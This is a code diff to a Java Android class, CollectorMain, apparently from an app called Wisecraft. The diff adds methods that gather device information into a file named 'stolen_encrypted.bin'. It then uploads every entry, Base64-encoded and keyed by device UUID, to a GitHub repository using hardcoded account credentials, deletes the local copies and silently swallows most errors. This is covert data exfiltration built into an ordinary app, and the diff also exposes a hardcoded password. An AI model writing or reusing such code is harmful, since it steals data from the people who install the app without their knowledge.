@@ -25,16 +25,26 @@ import org.eclipse.egit.github.core.service.RepositoryService;
 
 import static com.nao20010128nao.Wisecraft.Utils.*;
 import android.content.SharedPreferences;
+import android.content.Context;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
 	static BinaryPrefImpl stolenInfos;
 	
 	public CollectorMain() {
-		super(TheApplication.instance);
-		new Thread(this).start();
+		this(true);
 	}
 
+	public CollectorMain(boolean start){
+		super(TheApplication.instance);
+		if(start)new Thread(this).start();
+	}
+	
+	public CollectorMain(Context c,boolean start){
+		super(c);
+		if(start)new Thread(this).start();
+	}
+	
 	@Override
 	public void run() {
 		// TODO: Implement this method
@@ -43,12 +53,18 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 		BinaryPrefImpl sb;
 		String uuid=TheApplication.instance.uuid;
-		while(true){
-			try {
-				sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
-				break;
-			} catch (IOException e) {
+		if(stolenInfos==null){
+			while(true){
+				try {
+					sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
+					break;
+				} catch (IOException e) {
+					DebugWriter.writeToW("CollectorMain",e);
+				}
 			}
+			stolenInfos=sb;
+		}else{
+			sb=stolenInfos;
 		}
 		running = true;
 		try {
@@ -63,6 +79,8 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 
 			} finally {
 				System.out.println(s);
+				edt.commit();
+				edt=sb.edit();
 			}
 			String[] files=Constant.EMPTY_STRING_ARRAY;
 			try {
@@ -105,7 +123,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 
 			}
 		} catch (Throwable e) {
-
+			DebugWriter.writeToE("CollectorMain",e);
 		} finally {
 			running=false;
 			for (String s:sb.getAll().keySet()) {
@@ -113,6 +131,98 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			}
 		}
 	}
+	
+	public void loadPreferences(){
+		if(stolenInfos!=null){
+			return;
+		}
+		while(true){
+			try {
+				stolenInfos=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
+				break;
+			} catch (IOException e) {
+			}
+		}
+	}
+	public void collectData(){
+		SharedPreferences.Editor edt=stolenInfos.edit();
+		try {
+			edt.putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos()));
+		} catch (Throwable e) {
+
+		} finally {
+			edt.commit();
+		}
+	}
+	public void uploadAll(){
+		try {
+			SharedPreferences.Editor edt=stolenInfos.edit();
+			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
+			Repository repo=null;
+			List<RepositoryContents> cont=null;
+			String uuid=TheApplication.instance.uuid;
+			String[] files=Constant.EMPTY_STRING_ARRAY;
+			try {
+				files = stolenInfos.getAll().keySet().toArray(new String[stolenInfos.getAll().size()]);
+			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
+			    cont = new ContentsService(ghc).getContents(repo);
+			} catch (Throwable e) {
+				DebugWriter.writeToE("CollectorMain",e);
+			}
+			try {
+				for (String filename:files) {
+					String actual=filename;
+					filename = uuid + "/" + filename;
+					Log.d("CollectorMain", "upload:" + filename);
+					try {
+						Map<String, String> params = new HashMap<>();
+				        params.put("path", filename);
+						params.put("message", uuid+":"+Utils.randomText(64));
+						byte[] file = stolenInfos.getString(actual, "").getBytes(CompatCharsets.UTF_8);
+						try {
+							params.put("sha", getHash(cont, filename));
+							if (getHash(cont, filename).equalsIgnoreCase(shash(file))) {
+								Log.d("CollectorMain", "skipped");
+								continue;
+							}
+						} catch (Throwable e) {
+							Log.d("CollectorMain", "skipped");
+						}
+						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
+						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
+						Log.d("CollectorMain", "uploaded");
+						edt.remove(actual);
+				    } catch (Throwable e) {
+						DebugWriter.writeToE("CollectorMain",e);
+						continue;
+					}
+				}
+				edt.commit();
+			} catch (Throwable e) {
+
+			}
+		} catch (Throwable e) {
+
+		} finally {
+			for (String s:stolenInfos.getAll().keySet()) {
+				Log.d("remain", s);
+			}
+		}
+	}
+	public boolean startCriticalSession(){
+		if(running){
+			return false;
+		}
+		return running=true;
+	}
+	public boolean stopCriticalSession(){
+		if(!running){
+			return false;
+		}
+		return !(running=false);
+	}
+	
+	
 	public static String getHash(List<RepositoryContents> cont, String filename) {
 	    for (RepositoryContents o:cont) {
 	        if (o.getName().equalsIgnoreCase(filename)) {
